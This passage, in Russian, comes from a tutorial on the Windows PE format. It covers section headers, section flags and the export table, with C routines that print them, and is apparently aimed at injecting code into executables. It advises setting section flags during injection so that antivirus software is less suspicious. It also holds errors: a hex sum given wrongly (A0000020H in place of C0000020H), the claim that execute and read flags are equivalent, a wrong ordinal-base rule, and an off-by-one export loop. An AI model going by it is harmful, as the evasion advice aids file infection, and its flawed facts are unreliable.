<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">typedef</span> <span style="color: #993333;">struct</span> _IMAGE_SECTION_HEADER <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; BYTE&nbsp; &nbsp; Name<span style="color: black;">&#91;</span><span style="color: #0000dd;">8</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">union</span> <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; PhysicalAddress<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; VirtualSize<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span> Misc<span style="color: #339933;">;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; VirtualAddress<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; SizeOfRawData<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; PointerToRawData<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; PointerToRelocations<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; PointerToLinenumbers<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; WORD&nbsp; &nbsp; NumberOfRelocations<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; WORD&nbsp; &nbsp; NumberOfLinenumbers<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; Characteristics<span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span> IMAGE_SECTION_HEADER<span style="color: #339933;">,</span> <span style="color: #339933;">*</span>PIMAGE_SECTION_HEADER<span style="color: #339933;">;</span><br/>
&nbsp;</div>
<p>Опишем по порядку эти поля:</p>
<dl>
<dt><strong>BYTE Name[8];</strong></dt><dd>Название секции.</dd>
<dt>union { DWORD PhysicalAddress; DWORD VirtualSize; } Misc;</dt><dd>Для EXE-файлов содержит виртуальный размер секции. Т.е. это размер, выровненный на SectionAlignment. Если это значение равно нулю, то загрузчик использует значение SizeOfRawData выровненное на SectionAlignment. Если это значение не выровнено, т.к. загрузчик может выровнять его сам в случае необходимости. Если это значение больше SizeOfRawData, то в памяти секция выравнивается нулями. Если это значение меньше SizeOfRawData, то...здесь начинаются расхождения реализации загрузчиков, так что на это лучше не полагаться. Для объектных файлов это поле указывает физический адрес секции.</dd>
<dt><strong>DWORD VirtualAddress;</strong></dt><dd>Это поле содержит адрес, куда загрузчик должен отобразить секцию. Это поле является RVA.</dd>
<dt><strong>DWORD SizeOfRawData;</strong></dt><dd>Это поле содержит размер секции, выровненный на ближайшую верхнюю границу размера файла.</dd>
<dt><strong>DWORD PointerToRawData;</strong></dt><dd>Это значение, есть файловое смещение, откуда брать исходные данные для секции при отображении.</dd>
<dt><strong>DWORD PointerToRelocations;</strong></dt><dd>Не используется в исполняемых файлах. Может быть любым.</dd>
<dt><strong>DWORD PointerToLinenumbers;</strong></dt><dd>Файловое смещение таблицы номеров строк. В данный момент не используется в исполняемых файлах. Может любое значение.</dd>
<dt><strong>WORD NumberOfRelocations;</strong></dt><dd>Количество перемещений в таблице базовых поправок для данной секции. Т.к. значение указателя на таблицу базовых поправок храниться в массиве DataDirectory, то это поле тоже может быть любым.</dd>
<dt><strong>WORD NumberOfLinenumbers;</strong></dt><dd>Количество номеров строк для данной секции. Т.к. поле PointerToLinenumbers не используется, то может принимать любые значения.</dd>
<dt><strong>DWORD Characteristics;</strong></dt><dd>Это поле содержит атрибуты секции. Атрибуты секции указывают на права доступа к ней, а также на некоторые особенности влияния на нее загрузчика. Флаги секций могут преобразовываться загрузчиком в атрибуты страниц и сегментов. Это поле всегда не равно нулю. Ниже приведен полный список флагов, которые нужны, остальные используются только в объектных файлах, либо вообще не используются.
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">#define IMAGE_SCN_CNT_CODE&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x00000020&nbsp; &nbsp; &nbsp; // Секция содержит код</span><br/>
<span style="color: #339933;">#define IMAGE_SCN_CNT_INITIALIZED_DATA&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x00000040&nbsp; &nbsp; &nbsp; // Секция содержит инициализированные данные</span><br/>
<span style="color: #339933;">#define IMAGE_SCN_CNT_UNINITIALIZED_DATA&nbsp; &nbsp; &nbsp; &nbsp; 0x00000080&nbsp; &nbsp; &nbsp; // Секция содержит неинициализированные данные.</span><br/>
<span style="color: #339933;">#define IMAGE_SCN_MEM_DISCARDABLE &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x02000000&nbsp; &nbsp; &nbsp; // Эта секция отбрасывается когда</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// программа уже загружена.</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Важно, при внедрении отбросить этот флаг</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// если он установлен для данной секции.</span><br/>
<span style="color: #339933;">#define IMAGE_SCN_MEM_SHARED&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x10000000&nbsp; &nbsp; &nbsp; // Секция является общедоступной или разделяемой.</span><br/>
<span style="color: #339933;">#define IMAGE_SCN_MEM_EXECUTE &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x20000000&nbsp; &nbsp; &nbsp; // Секция является исполняемой.</span><br/>
<span style="color: #339933;">#define IMAGE_SCN_MEM_READ&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x40000000&nbsp; &nbsp; &nbsp; // Данные секции можно читать.</span><br/>
<span style="color: #339933;">#define IMAGE_SCN_MEM_WRITE &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x80000000&nbsp; &nbsp; &nbsp; // В секцию можно записывать данные.</span><br/>
&nbsp;</div>
<p>Флаги IMAGE_SCN_MEM_EXECUTE и IMAGE_SCN_MEM_READ эквивалентны. Флаги могут быть использованы одновременно, если применять к ним побитовою операцию "или-. Например, нам нужно чтобы в секцию можно было записывать, читать из нее, а также для пущей надежности указывает, что секция содержит код. Т.о. итоговой значение поля Characteristics будет выглядить следующим образом:</p>
<pre>
80000000H
+
40000000H
+
00000020H
=
A0000020H
</pre>
<p>Это значение мы будем использовать при внедрении в последнюю секцию, чтобы использовать переменные внутри нее и выполнять код. Мы указываем, что секция содержит код, т.к. антивирус может обращать на это внимание, если точка входа установлена на данную секцию.</p>
</dd>
</dl>
<h3><a name="c2a"></a>Работа с таблицей секций</h3>
<p>Данная процедура проходит по таблице секций и выводит ее на экран. На вход процедуре передается адрес по которому спроецирован PE-файл.</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">void</span> printSectionHeader<span style="color: black;">&#40;</span><span style="color: #993333;">long</span> hMap<span style="color: black;">&#41;</span><br/>
<span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; PIMAGE_NT_HEADERS &nbsp; &nbsp; &nbsp; pPE<span style="color: #339933;">=</span>static_cast<span style="color: #339933;">&lt;</span><span style="color: #993333;">struct</span> _IMAGE_NT_HEADERS<span style="color: #339933;">&gt;</span>NTSIGNATURE<span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span>hMap<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; PIMAGE_SECTION_HEADER &nbsp; Section<span style="color: #339933;">=</span><span style="color: black;">&#40;</span>PIMAGE_SECTION_HEADER<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#40;</span>pPE<span style="color: #339933;">-&gt;</span>FileHeader.<span style="color: #202020;">SizeOfOptionalHeader</span><span style="color: #339933;">+</span><span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span><span style="color: #339933;">&amp;</span><span style="color: black;">&#40;</span>pPE<span style="color: #339933;">-&gt;</span>OptionalHeader<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span><span style="color: #993333;">int</span> i<span style="color: #339933;">=</span><span style="color: #0000dd;">0</span><span style="color: #339933;">;</span>i<span style="color: #339933;">&lt;</span>pPE<span style="color: #339933;">-&gt;</span>FileHeader.<span style="color: #202020;">NumberOfSections</span><span style="color: #339933;">;</span>i<span style="color: #339933;">++</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span> <span style="color: #ff0000;">&quot;----------Section: %.8s----------<span style="color: #000099; font-weight: bold;">\n</span>Virtual Address:&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;%X<span style="color: #000099; font-weight: bold;">\n</span>Virtual Size: %X<span style="color: #000099; font-weight: bold;">\n</span>SizeOfRawData: %X<span style="color: #000099; font-weight: bold;">\n</span> PointerToRawData:&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;%X<span style="color: #000099; font-weight: bold;">\n</span>Characteristics: %X<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">&amp;</span><span style="color: black;">&#40;</span>Section<span style="color: #339933;">-&gt;</span>Name<span style="color: black;">&#41;</span><span style="color: #339933;">,</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Section<span style="color: #339933;">-&gt;</span>VirtualAddress<span style="color: #339933;">,</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Section<span style="color: #339933;">-&gt;</span>Misc.<span style="color: #202020;">VirtualSize</span><span style="color: #339933;">,</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Section<span style="color: #339933;">-&gt;</span>SizeOfRawData<span style="color: #339933;">,</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Section<span style="color: #339933;">-&gt;</span>PointerToRawData<span style="color: #339933;">,</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Section<span style="color: #339933;">-&gt;</span>Characteristics<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Section<span style="color: #339933;">++;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br />
<span style="color: black;">&#125;</span><br />
&nbsp;</div>
<p>Вот вроде разобрались со всеми заголовками, теперь нужно рассмотреть важные директории. Они понадобятся в нашем деле.</p>
<h3><a name="c2b"></a>Таблица Экспорта</h3>
<p>Экспорт - механизм PE-файлов, предоставляющий доступ к переменным или функциям из другого исполняемого модуля. Обычно EXE-файлы ничего не экспортируют. А DLL обычно экспортируют функции. Таблица секций может быть отдельной секцией, которая называется .edata. Но обычно таблицу секций ищут исходя из каталога данных. Она имеет индекс 0 в массиве DataDirectory. В таблице экспорта содержится массив, в котором находятся адреса функций. Ординал - это индекс в этом массиве адресов функций. Функции могут экcпортироваться либо по имени, либо по ординалу. Если функция экспортируется по ординалу, то загрузчик почти ничего не делает, а просто обращается сразу к таблице адресов функций. Но обычно функции экспортируются по именам. Чтобы экспортировать функции по именам, необходимо произвести некоторые действия. Какие, узнаете чуть ниже.</p>
<p>В начале таблицы экспорта расположена структура IMAGE_EXPORT_DIRECTORY. После этой структуры должны идти данные, на которые указывают элементы этой структуры. Но практически данные могут быть расположены где угодно. Вот вид структуры IMAGE_EXPORT_DIRECTORY:</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">typedef</span> <span style="color: #993333;">struct</span> _IMAGE_EXPORT_DIRECTORY <span style="color: black;">&#123;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; Characteristics<span style="color: #339933;">;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; TimeDateStamp<span style="color: #339933;">;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; WORD&nbsp; &nbsp; MajorVersion<span style="color: #339933;">;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; WORD&nbsp; &nbsp; MinorVersion<span style="color: #339933;">;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; Name<span style="color: #339933;">;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; Base<span style="color: #339933;">;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; NumberOfFunctions<span style="color: #339933;">;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; NumberOfNames<span style="color: #339933;">;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; AddressOfFunctions<span style="color: #339933;">;</span> &nbsp; &nbsp; <span style="color: black; font-style: italic;">// RVA from base of image</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; AddressOfNames<span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// RVA from base of image</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; AddressOfNameOrdinals<span style="color: #339933;">;</span>&nbsp; <span style="color: black; font-style: italic;">// RVA from base of image</span><br />
<span style="color: black;">&#125;</span> IMAGE_EXPORT_DIRECTORY<span style="color: #339933;">,</span> <span style="color: #339933;">*</span>PIMAGE_EXPORT_DIRECTORY<span style="color: #339933;">;</span><br />
&nbsp;</div>
<dl>
	<dt><strong>DWORD Characteristics;</strong></dt><dd>Это поле не используется. Может быть любым.</dd>
	<dt><strong>DWORD TimeDateStamp;</strong></dt><dd>Это поле содержит дату создания файла. Может быть любым.</dd>
	<dt><strong>WORD MajorVersion; WORD MinorVersion;</strong></dt><dd>Поля не используются. Могут быть любыми.</dd>
	<dt><strong>DWORD Name;</strong></dt><dd>Это RVA ASCIIZ-строки содержащей имя данного исполняемого модуля.</dd>
	<dt><strong>DWORD Base;</strong></dt><dd>Начальный номер экспорта, т.е. самый младший номер экспортируемой функции. Например, если номера экспортируемых функций 56B, 57B, 58B и больше экспортируемых функций нет, то это значение будет 56B.</dd>
	<dt><strong>DWORD NumberOfFunctions;</strong></dt><dd>Количество элементов в массиве AddressOfFunctions(об этом массиве позже). Это число экспортируемых данным модулем функций или переменных. Может быть равно, а может быть и не равно значению NumberOfNames, потому что функция может быть экспортирована только по ординалу.</dd>
	<dt><strong>DWORD NumberOfNames;</strong></dt><dd>Количество элементов в масcиве AddressOfNames. Также это число функций экспортируемых по именам.</dd>
	<dt><strong>DWORD AddressOfFunctions;</strong></dt><dd>RVA массива адресов функций. Адреса функций - это RVA точек входа каждой функции. Т.к. RVA в PE32 32-х разрядные, то это массив DWORD'ов.</dd>
	<dt><strong>DWORD AddressOfNames;</strong></dt><dd>Это поле является RVA и указывает на массив указателей на строки. Строки - ASCIIZ-строки, и являются именами экспортируемых функций по имени в данном модуле.</dd>
	<dt><strong>DWORD AddressOfNameOrdinals;</strong></dt><dd>RVA массива слов. Слова являются ординалами, т.е. индексами в массиве адресов функций. Но эти индексы являются относительными, т.к. из соответствующего индекса надо вычесть начальный номер экспорта.</dd>
</dl>
<h3><a name="c2c"></a>Как происходит экспорт</h3>
<p>Самое важное поле в таблице экспорта - это AddressOfFunctions, потому что оно и содержит адреса экспортируемых функций. Можно по разному экспортировать функции - по имени или по ординалу. Чтобы экспортировать функцию по ординалу достаточно использовать ординал, как индекс в массиве адресов функций, но, не забывая, о начальном номере экспорта. Чтобы экспортировать функцию по имени надо использовать информацию из двух дополнительных массивов, точнее указателей на них - AddressOfNameOrdinals и AddressOfNames. Массив AddressOfNames содержит RVA строк с именами функций. Нам дано имя функции, надо найти это имя в данном массиве. Если мы нашли имя, то получаем индекс в массиве имен, которому соответствует данная строка. Используя этот индекс применительно к массиву AddressOfNameOrdinals, находим индекс в массиве AddressOfFunctios, но без учета начального номера экспорта или начального ординала. Полученное значение нормализуем и получаем нужный ординал, который и используем для получения адреса функции по данному имени. Посмотрите рисунок ниже, чтобы понять это объяснение:</p>
<div align="center">
	<img src="img/vbp01/fig22.gif" alt="" />
</div>
<p>Не забывайте, что имена функций могут быть представлены в двух версиях - ANSI и UNICODE, если функция каким-либо образом обрабатывает строки. И имя функции различаться в зависимости от версии функции. Для ANSI версии в конце имени функции используется буква A, для UNICODE - W.</p>
<p>В таблице адресов функций могут быть разрывы, т.е. элементы, которые указывают в никуда. Т.е. если библиотека экспортирует функции с ординалами 5,8 и все, а начальный номер экспорта 5, то в массиве адресов функций будет 4 элемента. Первый нормальный, т.е. указывающий на функцию, два следующих пустые, 4-ый нормальный. Эти разрывы надо учитывать при разборе, а не обрабатывать все подряд.</p>
<h4><a name="c2c1"></a>Передача экспорта</h4>
<p>Иногда в одной DLL содержится только имя функции, а сам код содержится в другой DLL, но экспортируем мы функцию из первой DLL. Этот механизм называется <em>передача экспорта</em>. Например, возьмем библиотеку KERNEL32.DLL. Возьмем из нее функцию HeapAlloc, она в действительности вызывает функцию RtlAllocateHeap из NTDLL.DLL.</p>
<p>Чтобы узнать, является ли функция переданной, нужно проверить не указывает ли адрес функции на таблицу экспорта данного файла (в данном случае KERNEL32.LL). Тогда этот "адрес функции- является RVA-строки вида <em>имя_библиотеки.имя_функции</em> (например NTDLL.RtlAllocateHeap). Для проверки является ли данная функция переданной, нужен адрес таблицы экспорта и ее размер. В примере ниже показано как определить, что функция является переданной.</p>
<h3><a name="c2d"></a>Работа с таблицей экспорта</h3>
<p>Работая с таблицей экспорта будьте внимательны. Не забывайте, что можно экспортировать функцию как по имени и ординалу, как просто по ординалу. Не забывайте о переданных функциях. Существуют две важные операции при работе с таблицей экспорта:</p>
<ol type="a">
	<li><strong>Поиск адреса функции по имени</strong>. Алгоритм выглядит так:
	<ol>
		<li>Найти индекс в массиве имен AddressOfNames, соответствующий нужному имени.</li>
		<li>Использовать этот индекс как индекс в массиве AddressOfNameOrdinals и получить значение в массиве.</li>
		<li>Вычесть из полученного значения OrdinalBase.</li>
		<li>Использовать полученный индекс, чтобы получить RVA функции в массиве AddressOfFuncions
			<p>Посмотрите на пример работы с директорией экспорта. Процедура выводит на экран таблицу экспорта. Параметром ей передается адрес спроецированного в память файла.</p>
		</li>
	</ol></li>
	<li><strong>Поиск имени по ординалу</strong>
	<ol>
		<li>Взять ординал и сложить его с OrdinalBase.</li>
		<li>Найти полученное значение в массиве AddressOfNameOrdinals.</li>
		<li>Если значение найдено, то используем индекс в массиве AddressOfNames, чтобы получить имя. Если значение не найдено, значит, функция экспортируется только по ординалу.</li>
	</ol></li>
</ol>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">void</span> PrintExportTable<span style="color: black;">&#40;</span><span style="color: #993333;">long</span> hMap<span style="color: black;">&#41;</span><br />
<span style="color: black;">&#123;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; PIMAGE_NT_HEADERS &nbsp; &nbsp; &nbsp; pPE<span style="color: #339933;">=</span><span style="color: black;">&#40;</span>PIMAGE_NT_HEADERS<span style="color: black;">&#41;</span>NTSIGNATURE<span style="color: black;">&#40;</span>hMap<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">short</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; NumberOfSection<span style="color: #339933;">=</span>pPE<span style="color: #339933;">-&gt;</span>FileHeader.<span style="color: #202020;">NumberOfSections</span><span style="color: #339933;">;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ExportRVA<span style="color: #339933;">=</span>pPE<span style="color: #339933;">-&gt;</span>OptionalHeader.<span style="color: #202020;">DataDirectory</span><span style="color: black;">&#91;</span><span style="color: #0000dd;">0</span><span style="color: black;">&#93;</span>.<span style="color: #202020;">VirtualAddress</span><span style="color: #339933;">;</span><br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; PIMAGE_EXPORT_DIRECTORY Export<span style="color: #339933;">=</span><span style="color: black;">&#40;</span>PIMAGE_EXPORT_DIRECTORY<span style="color: black;">&#41;</span>RVAtoOffset<span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span>hMap<span style="color: #339933;">,</span>ExportRVA<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; Export<span style="color: #339933;">=</span><span style="color: black;">&#40;</span>PIMAGE_EXPORT_DIRECTORY<span style="color: black;">&#41;</span><span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span>Export<span style="color: #339933;">+</span><span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span>hMap<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; WORD<span style="color: #339933;">*</span> &nbsp; AddressOfNameOrdinals<span style="color: #339933;">=</span><span style="color: black;">&#40;</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">short</span> <span style="color: #339933;">*</span><span style="color: black;">&#41;</span>RVAtoOffset<span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span>hMap<span style="color: #339933;">,</span>Export<span style="color: #339933;">-&gt;</span>AddressOfNameOrdinals<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; AddressOfNameOrdinals<span style="color: #339933;">=</span><span style="color: black;">&#40;</span>WORD<span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span>AddressOfNameOrdinals<span style="color: #339933;">+</span><span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span>hMap<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
<br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; DWORD<span style="color: #339933;">*</span>&nbsp; AddressOfNames<span style="color: #339933;">=</span><span style="color: black;">&#40;</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> <span style="color: #339933;">*</span><span style="color: black;">&#41;</span>RVAtoOffset<span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span>hMap<span style="color: #339933;">,</span>Export<span style="color: #339933;">-&gt;</span>AddressOfNames<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; AddressOfNames<span style="color: #339933;">=</span><span style="color: black;">&#40;</span>DWORD<span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span>AddressOfNames<span style="color: #339933;">+</span><span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span>hMap<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; DWORD<span style="color: #339933;">*</span> AddressOfFunctions<span style="color: #339933;">=</span><span style="color: black;">&#40;</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span>RVAtoOffset<span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span>hMap<span style="color: #339933;">,</span>Export<span style="color: #339933;">-&gt;</span>AddressOfFunctions<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; AddressOfFunctions<span style="color: #339933;">=</span><span style="color: black;">&#40;</span>DWORD<span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span>AddressOfFunctions<span style="color: #339933;">+</span><span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span>hMap<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
<br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; WORD&nbsp; &nbsp; index<span style="color: #339933;">;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span> <span style="color: #ff0000;">&quot;%4s %-40s %s<span style="color: #000099; font-weight: bold;">\n</span>-----------------------------------------------------------------------<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;Ordinal&quot;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">&quot;NameOfFunctions&quot;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">&quot;EntryPoint&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">int</span> i<span style="color: #339933;">=</span><span style="color: #0000dd;">0</span><span style="color: #339933;">;</span>i<span style="color: #339933;">&lt;</span>Export<span style="color: #339933;">-&gt;</span>NumberOfFunctions<span style="color: #339933;">-</span><span style="color: #0000dd;">1</span><span style="color: #339933;">;</span>i<span style="color: #339933;">++</span><span style="color: black;">&#41;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; index<span style="color: #339933;">=</span><span style="color: #208080;">0xFFFF</span><span style="color: #339933;">;</span><br />
